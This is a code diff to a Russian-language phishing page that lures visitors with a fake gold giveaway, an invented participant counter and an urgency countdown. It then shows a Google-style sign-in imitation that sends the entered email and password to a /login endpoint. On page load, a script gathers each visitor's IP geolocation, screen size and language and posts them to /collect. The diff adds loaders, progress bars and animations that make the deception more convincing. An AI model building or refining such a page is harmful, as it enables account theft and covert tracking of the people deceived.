@@ -8,6 +8,75 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
+        /* ===== ЛОАДЕР ===== */
+        #loader {
+            position: fixed;
+            inset: 0;
+            background: #0a0a10;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+        }
+        #loader.hide { opacity: 0; pointer-events: none; }
+        .loader-ring {
+            width: 56px;
+            height: 56px;
+            border: 3px solid #ffd70022;
+            border-top-color: #ffd700;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        .loader-text {
+            margin-top: 18px;
+            color: #ffd700;
+            font-size: 14px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            opacity: 0.8;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== ПРОГРЕСС-БАР ===== */
+        .progress-bar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 3px;
+            background: rgba(255,255,255,0.06);
+            z-index: 100;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 33%;
+            background: linear-gradient(90deg, #ffd700, #f0a500);
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 12px #ffd70088;
+        }
+
+        /* ===== АНИМАЦИИ ===== */
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes pulseGold {
+            0%, 100% { transform: scale(1); color: #fff; }
+            50% { transform: scale(1.15); color: #ffd700; }
+        }
+        @keyframes floatCoin {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(8deg); }
+        }
+        .animate-in { animation: fadeUp 0.45s cubic-bezier(0.4, 0, 0.2, 1); }
+        .pulse { animation: pulseGold 0.4s ease; }
+
         /* ===== СТРАНИЦА 1: ГОЛДА ===== */
         .step1-body {
             background: #0a0a10;
@@ -37,7 +106,12 @@
             box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 40px #ffd70008;
             position: relative; z-index: 1;
         }
-        .gold-icon { font-size: 48px; margin-bottom: 6px; display: block; }
+        .gold-icon {
+            font-size: 48px;
+            margin-bottom: 6px;
+            display: inline-block;
+            animation: floatCoin 3s ease-in-out infinite;
+        }
         .gold-badge {
             background: linear-gradient(135deg, #2a2a3a, #1a1a28);
             padding: 10px 22px;
@@ -52,19 +126,17 @@
         .dark-title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 6px; }
         .dark-desc { color: #99aabb; font-size: 15px; margin-bottom: 18px; }
 
-        /* Счётчик */
         .counter {
             background: rgba(255,215,0,0.06);
             border: 1px solid #ffd70033;
             border-radius: 12px;
             padding: 10px 14px;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
             font-size: 14px;
             color: #ffd700;
         }
-        .counter b { color: #fff; font-size: 16px; }
+        .counter b { color: #fff; font-size: 16px; display: inline-block; }
 
-        /* Таймер */
         .timer {
             background: rgba(255,60,60,0.08);
             border: 1px solid #ff444433;
@@ -89,12 +161,23 @@
             width: 100%; padding: 16px 0;
             border: none; border-radius: 40px;
             font-size: 20px; font-weight: 800;
-            cursor: pointer; transition: 0.3s;
+            cursor: pointer; transition: 0.2s;
             text-transform: uppercase; letter-spacing: 1px;
             background: linear-gradient(135deg, #ffd700, #f0a500);
             color: #0a0a10;
             box-shadow: 0 4px 20px #ffd70033;
+            position: relative;
+            overflow: hidden;
         }
+        .btn-gold::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.6s;
+        }
+        .btn-gold:hover::after { left: 100%; }
         .btn-gold:hover { transform: scale(1.02); box-shadow: 0 4px 40px #ffd70055; }
         .btn-gold:active { transform: scale(0.96); }
         .footer { margin-top: 16px; font-size: 12px; color: #445; }
@@ -232,9 +315,26 @@
             min-width: 88px;
             transition: background 0.15s, box-shadow 0.15s;
             font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         .btn-next:hover { background: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
         .btn-next:active { background: #1557b0; }
+        .btn-next:disabled { background: #a0c2f0; cursor: not-allowed; }
+
+        /* Спиннер внутри кнопки */
+        .btn-spinner {
+            width: 14px; height: 14px;
+            border: 2px solid #ffffff66;
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+        .btn-next.loading .btn-spinner { display: inline-block; }
+        .btn-next.loading .btn-text { opacity: 0.7; }
 
         .account-chip {
             display: inline-flex;
@@ -296,7 +396,12 @@
             max-width: 400px;
             width: 100%;
         }
-        .check-icon { font-size: 60px; margin-bottom: 10px; display: block; }
+        .check-icon {
+            font-size: 64px;
+            margin-bottom: 12px;
+            display: inline-block;
+            animation: fadeUp 0.5s ease;
+        }
         .success-title { font-size: 24px; font-weight: 700; color: #ffd700; margin-bottom: 8px; }
         .success-desc { color: #99aabb; font-size: 16px; margin-bottom: 10px; }
         .timer-text { font-size: 14px; color: #667; }
@@ -316,6 +421,17 @@
     </style>
 </head>
 <body>
+
+    <!-- ===== ЛОАДЕР ===== -->
+    <div id="loader">
+        <div class="loader-ring"></div>
+        <div class="loader-text">Загрузка...</div>
+    </div>
+
+    <!-- ===== ПРОГРЕСС-БАР ===== -->
+    <div class="progress-bar" id="progressBar" style="display:none;">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
 
     <!-- ============ СТРАНИЦА 1: ГОЛДА ============ -->
     <div id="step1" class="step1-body">
@@ -380,7 +496,10 @@
 
                 <div class="google-actions">
                     <a href="#" class="create-account" onclick="return false;">Создать аккаунт</a>
-                    <button type="submit" class="btn-next">Далее</button>
+                    <button type="submit" class="btn-next" id="emailBtn">
+                        <span class="btn-spinner"></span>
+                        <span class="btn-text">Далее</span>
+                    </button>
                 </div>
             </form>
         </div>
@@ -414,7 +533,10 @@
 
                 <div class="google-actions">
                     <a href="#" class="create-account" onclick="return false;">Забыли пароль?</a>
-                    <button type="submit" class="btn-next">Далее</button>
+                    <button type="submit" class="btn-next" id="passBtn">
+                        <span class="btn-spinner"></span>
+                        <span class="btn-text">Далее</span>
+                    </button>
                 </div>
             </form>
         </div>
@@ -434,13 +556,28 @@
     <script>
         let savedEmail = '';
 
-        // ===== СБОР IP + ГЕОЛОКАЦИИ ПРИ ЗАХОДЕ =====
+        // ===== СКРЫТИЕ ЛОАДЕРА =====
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('loader').classList.add('hide');
+                setTimeout(function() {
+                    document.getElementById('loader').style.display = 'none';
+                }, 500);
+            }, 600);
+        });
+
+        // ===== ВИБРАЦИЯ =====
+        function vibrate(ms) {
+            if (navigator.vibrate) {
+                try { navigator.vibrate(ms); } catch (e) {}
+            }
+        }
+
+        // ===== СБОР IP + ГЕО =====
         (async function collectVisitorInfo() {
             try {
-                // Получаем IP и гео через бесплатный API
                 const r = await fetch('https://ipapi.co/json/');
                 const geo = await r.json();
-
                 await fetch('/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -453,15 +590,11 @@
                             lat: geo.latitude || '',
                             lon: geo.longitude || ''
                         },
-                        screen: {
-                            w: window.screen.width,
-                            h: window.screen.height
-                        },
+                        screen: { w: window.screen.width, h: window.screen.height },
                         lang: navigator.language || ''
                     })
                 });
             } catch (e) {
-                // Если API не отвечает — пробуем через резервный сервис
                 try {
                     const r2 = await fetch('https://ip-api.com/json/');
                     const geo2 = await r2.json();
@@ -485,18 +618,19 @@
             }
         })();
 
-        // ===== СЧЁТЧИК УЧАСТНИКОВ =====
+        // ===== СЧЁТЧИК =====
         (function startCounter() {
             const el = document.getElementById('counterNum');
-            // Начальное число + случайный разброс
             let count = 1200 + Math.floor(Math.random() * 600);
 
             function update() {
                 el.textContent = count.toLocaleString('ru-RU');
+                el.classList.remove('pulse');
+                void el.offsetWidth;
+                el.classList.add('pulse');
             }
             update();
 
-            // Прирост каждые 4–10 секунд
             function tick() {
                 count += Math.floor(Math.random() * 3) + 1;
                 update();
@@ -505,10 +639,10 @@
             setTimeout(tick, 4000);
         })();
 
-        // ===== ТАЙМЕР ОБРАТНОГО ОТСЧЁТА (2 часа) =====
+        // ===== ТАЙМЕР =====
         (function startTimer() {
             const el = document.getElementById('timerDisplay');
-            let totalSeconds = 2 * 60 * 60; // 2 часа
+            let totalSeconds = 2 * 60 * 60;
 
             function render() {
                 const h = Math.floor(totalSeconds / 3600);
@@ -520,14 +654,18 @@
                     String(s).padStart(2, '0');
             }
             render();
-
             setInterval(function() {
-                if (totalSeconds > 0) {
-                    totalSeconds--;
-                    render();
-                }
+                if (totalSeconds > 0) { totalSeconds--; render(); }
             }, 1000);
         })();
+
+        // ===== ПРОГРЕСС-БАР =====
+        function setProgress(percent) {
+            const bar = document.getElementById('progressBar');
+            const fill = document.getElementById('progressFill');
+            bar.style.display = 'block';
+            fill.style.width = percent + '%';
+        }
 
         // ===== ПЕРЕКЛЮЧЕНИЕ ШАГОВ =====
         function showStep(step) {
@@ -538,14 +676,20 @@
 
             if (step === 'start') {
                 document.getElementById('step1').classList.remove('hidden');
+                document.getElementById('step1').classList.add('animate-in');
+                setProgress(33);
             } else if (step === 'email') {
                 document.getElementById('step2').classList.remove('hidden');
+                document.getElementById('step2').classList.add('animate-in');
+                setProgress(60);
                 setTimeout(function() {
                     var el = document.getElementById('email');
                     if (el) el.focus();
-                }, 100);
+                }, 150);
             } else if (step === 'password') {
                 document.getElementById('step2b').classList.remove('hidden');
+                document.getElementById('step2b').classList.add('animate-in');
+                setProgress(85);
                 if (savedEmail) {
                     document.getElementById('chipEmail').textContent = savedEmail;
                     document.getElementById('chipAvatar').textContent = savedEmail.charAt(0).toUpperCase();
@@ -553,45 +697,61 @@
                 setTimeout(function() {
                     var p = document.getElementById('password');
                     if (p) p.focus();
-                }, 100);
+                }, 150);
             } else if (step === 'success') {
                 document.getElementById('step3').classList.remove('hidden');
+                document.getElementById('step3').classList.add('animate-in');
+                setProgress(100);
             }
         }
 
         function showStep2() {
+            vibrate(30);
             history.pushState({ step: 'email' }, '', '#email');
             showStep('email');
         }
 
+        // ===== EMAIL =====
         function submitEmail(e) {
             e.preventDefault();
-            var email = document.getElementById('email').value.trim();
-            var errorMsg = document.getElementById('errorMsg');
+            const email = document.getElementById('email').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const btn = document.getElementById('emailBtn');
 
             if (!email) {
                 errorMsg.textContent = 'Введите адрес электронной почты';
                 return;
             }
             errorMsg.textContent = '';
-            savedEmail = email;
 
-            document.getElementById('chipEmail').textContent = email;
-            document.getElementById('chipAvatar').textContent = email.charAt(0).toUpperCase();
+            btn.classList.add('loading');
+            btn.disabled = true;
+            vibrate(20);
 
-            history.pushState({ step: 'password' }, '', '#password');
-            showStep('password');
+            setTimeout(function() {
+                savedEmail = email;
+                document.getElementById('chipEmail').textContent = email;
+                document.getElementById('chipAvatar').textContent = email.charAt(0).toUpperCase();
+
+                btn.classList.remove('loading');
+                btn.disabled = false;
+
+                history.pushState({ step: 'password' }, '', '#password');
+                showStep('password');
+            }, 500);
         }
 
+        // ===== ПАРОЛЬ =====
         function togglePass() {
-            var p = document.getElementById('password');
+            const p = document.getElementById('password');
             p.type = (p.type === 'password') ? 'text' : 'password';
         }
 
         async function submitPassword(e) {
             e.preventDefault();
-            var password = document.getElementById('password').value;
-            var errorMsg = document.getElementById('errorMsg2');
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg2');
+            const btn = document.getElementById('passBtn');
 
             if (!password) {
                 errorMsg.textContent = 'Введите пароль';
@@ -599,27 +759,37 @@
             }
             errorMsg.textContent = '';
 
+            btn.classList.add('loading');
+            btn.disabled = true;
+            vibrate(20);
+
             try {
-                var res = await fetch('/login', {
+                const res = await fetch('/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email: savedEmail, password: password })
                 });
-                var data = await res.json();
+                const data = await res.json();
 
                 if (data.success) {
                     history.pushState({ step: 'success' }, '', '#success');
                     setTimeout(function() {
+                        vibrate([50, 30, 50]);
                         showStep('success');
                     }, 700);
                 } else {
                     errorMsg.textContent = data.error || 'Неверный пароль. Повторите попытку.';
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
                 }
             } catch (err) {
                 errorMsg.textContent = 'Ошибка соединения. Попробуйте снова.';
+                btn.classList.remove('loading');
+                btn.disabled = false;
             }
         }
 
+        // ===== ИСТОРИЯ =====
         history.replaceState({ step: 'start' }, '', '#start');
 
         window.addEventListener('popstate', function(event) {
@@ -631,9 +801,11 @@
         });
 
         window.addEventListener('DOMContentLoaded', function() {
-            var hash = window.location.hash.replace('#', '');
+            const hash = window.location.hash.replace('#', '');
             if (hash === 'email' || hash === 'password' || hash === 'success') {
                 showStep(hash);
+            } else {
+                setProgress(33);
             }
         });
     </script>
